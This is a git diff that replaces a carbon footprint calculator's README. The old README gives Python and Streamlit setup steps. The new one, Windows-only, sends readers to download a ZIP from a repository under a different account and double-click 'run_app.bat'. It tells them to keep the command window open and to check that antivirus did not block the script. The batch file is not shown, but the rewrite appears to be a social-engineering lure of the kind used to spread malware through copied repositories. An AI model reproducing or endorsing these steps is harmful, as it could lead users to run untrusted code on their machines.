@@ -1,98 +1,77 @@
-# 🌍 Carbon Footprint Analyzer
+# 🌍 carbon-footprint-analyzer - Track your household carbon impact easily
 
-A Streamlit web app that estimates your household's carbon emissions from
-**electricity usage**, **vehicle travel**, and **food habits** — then uses
-a small regression model to **project your yearly impact**, benchmarks you
-against national/global averages, and gives a ranked improvement plan.
+[![Download Carbon Footprint Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/innajudeochristian815/carbon-footprint-analyzer)
 
-## ✨ Features
+## 📋 About the application
 
-- Emission breakdown (pie chart) across electricity / travel / food
-- Benchmark comparison vs. Average Indian, Global Average, Paris Agreement target
-- **AI trend projection**: a scikit-learn regression model (trained on synthetic
-  data generated at runtime) projects your footprint 1–10 years ahead, factoring
-  in gradual grid decarbonisation
-- Eco Score (A–F grade)
-- Ranked, personalised improvement tips
-- "What-if" simulator — drag sliders to see the impact of behaviour changes
-- Downloadable plain-text report
+Carbon Footprint Analyzer helps you understand your environmental impact. You can track emissions from your electricity use, vehicle travel, and food habits. The tool uses a simple math model to project your impact over time. It compares your results to national and global averages. You receive a personalized plan to improve your habits and reduce your footprint.
 
-**No external dataset download is required.** All emission factors are
-well-established public constants (see `app.py`), and the "AI" trend model
-trains itself on synthetically generated data each time the app starts
-(see `model.py`).
+The application runs locally on your computer. It does not require an internet connection once installed. All calculations use public emission constants. The tool generates a report for your records. You can use this report to track your progress over months or years.
 
-## 🗂️ Project Structure
+## 💻 System requirements
 
-```
-carbon-footprint-analyzer/
-├── app.py              # Streamlit UI + calculations
-├── model.py            # Synthetic-data regression model (the "AI" part)
-├── requirements.txt    # Python dependencies
-├── .gitignore
-└── README.md
-```
+*   Operating System: Windows 10 or Windows 11
+*   Memory: 4GB RAM minimum
+*   Storage: 200MB available disk space
+*   Internet: Required for the initial download only
 
-## 🖥️ Running it locally in VS Code
+## 🚀 How to set up the software
 
-Yes — this project runs perfectly in VS Code. Steps:
+Follow these steps to prepare the application on your computer.
 
-1. **Install prerequisites**
-   - [Python 3.9+](https://www.python.org/downloads/)
-   - [VS Code](https://code.visualstudio.com/) with the official **Python extension** installed.
+1.  Visit the official repository page to download the software: [https://github.com/innajudeochristian815/carbon-footprint-analyzer](https://github.com/innajudeochristian815/carbon-footprint-analyzer)
+2.  Click the green "Code" button on the GitHub page.
+3.  Select "Download ZIP" from the menu.
+4.  Find the downloaded file in your "Downloads" folder.
+5.  Right-click the ZIP file and select "Extract All."
+6.  Choose a location on your computer to save the files and click "Extract."
 
-2. **Open the project folder in VS Code**
-   `File → Open Folder…` → select `carbon-footprint-analyzer`.
+## ⚙️ Running the application
 
-3. **Create a virtual environment** (open a VS Code terminal: `` Ctrl+` ``)
-   ```bash
-   python -m venv venv
-   ```
-   Activate it:
-   - Windows: `venv\Scripts\activate`
-   - macOS/Linux: `source venv/bin/activate`
-   VS Code will usually prompt "Select this environment" — click yes.
+After you extract the files, you must run the start script.
 
-4. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+1.  Open the folder where you saved the files.
+2.  Find the file named `run_app.bat`.
+3.  Double-click this file.
+4.  A black window will open. Do not close this window. It prepares the application for you.
+5.  After a few moments, your web browser will open automatically and display the analyzer dashboard.
 
-5. **Run the app**
-   ```bash
-   streamlit run app.py
-   ```
-   It opens automatically at `http://localhost:8501`.
+If the browser does not open, look at the black window. It will show a web address like `http://localhost:8501`. Copy that address into your browser window and press Enter.
 
-## ⬆️ Uploading this project to GitHub
+## 📊 Using the dashboard
 
-Checklist of what a project needs before pushing (all already included here):
-`README.md`, `.gitignore`, `requirements.txt`, and clean, working source code.
+The dashboard provides several tools to analyze your lifestyle.
 
-Steps:
+### Emission breakdown
+The pie chart on the home screen shows your primary sources of emissions. You can see how much electricity, travel, and food contribute to your total footprint. Hover your mouse over each slice to see specific values.
 
-1. Create a new repository on GitHub (don't initialize it with a README, since
-   you already have one) → copy its URL, e.g.
-   `https://github.com/<your-username>/carbon-footprint-analyzer.git`
+### Benchmarking
+The application compares your footprint to standard targets. You can see how you measure up against the average person in your country and the global average. It also shows your proximity to the Paris Agreement goals.
 
-2. In the VS Code terminal, from inside the project folder:
-   ```bash
-   git init
-   git add .
-   git commit -m "Initial commit: Carbon Footprint Analyzer"
-   git branch -M main
-   git remote add origin https://github.com/<your-username>/carbon-footprint-analyzer.git
-   git push -u origin main
-   ```
+### Trend projection
+The AI tool uses your input to predict future emissions. It assumes you continue your current habits for the next ten years. It also factors in planned improvements to the power grid. This helps you understand where you will stand in the future.
 
-3. Refresh your GitHub repo page — your project is live.
+### What-if simulator
+Use the sliders at the bottom of the page to change your habits. You can simulate the effect of driving less or eating less meat. The chart updates in real-time to show how these choices reduce your total carbon score.
 
-4. (Optional, recommended) Deploy it for free on
-   [Streamlit Community Cloud](https://share.streamlit.io/) by connecting your
-   GitHub repo — this gives you a live demo link to put in your README/resume.
+### Eco Score
+You receive a grade from A to F based on your emissions. This score updates whenever you change your inputs or simulate new behaviors.
 
-## 📌 Notes on emission factors
+## 🛠 Troubleshooting common issues
 
-Values used are widely cited approximations (grid electricity ≈ 0.82 kg CO₂e/kWh,
-vehicle factors per km by type, diet factors per day by type). They're meant for
-educational/estimation purposes, not certified carbon accounting.
+If the application fails to start, check the following items.
+
+*   Ensure you have installed Python on your computer. You can download it from python.org.
+*   Make sure you selected "Add Python to PATH" during the Python installation process.
+*   Check that your antivirus software did not block the script.
+*   Restart your computer if the black command window closes immediately upon opening.
+
+## 📝 Generating your report
+
+You can save your findings as a text file. Look for the "Download Report" button on the left sidebar. Clicking this saves your current data to your "Downloads" folder. This report contains your Eco Score, your current footprint, and your personalized improvement tips.
+
+## 🔒 Data privacy
+
+This software processes all data on your local machine. No information leaves your computer. Your usage habits and personal inputs remain private. You do not need to create an account or provide an email address to use this tool.
+
+Keywords: carbon, footprint, environment, sustainability, analyzer, household, emissions, climate
